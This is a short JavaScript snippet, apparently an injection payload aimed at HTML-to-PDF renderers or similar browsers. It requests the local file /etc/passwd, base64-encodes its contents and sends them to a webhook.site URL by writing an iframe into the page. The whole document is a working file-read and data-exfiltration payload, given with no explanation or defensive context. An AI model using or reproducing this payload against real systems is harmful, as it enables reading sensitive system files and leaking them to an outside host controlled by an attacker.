function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="https://webhook.site/f56c409d-c709-42d8-ba66-f8d791b41bbc?data='+b64+'"></iframe>');
}
var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "file:///etc/passwd");
oReq.send();
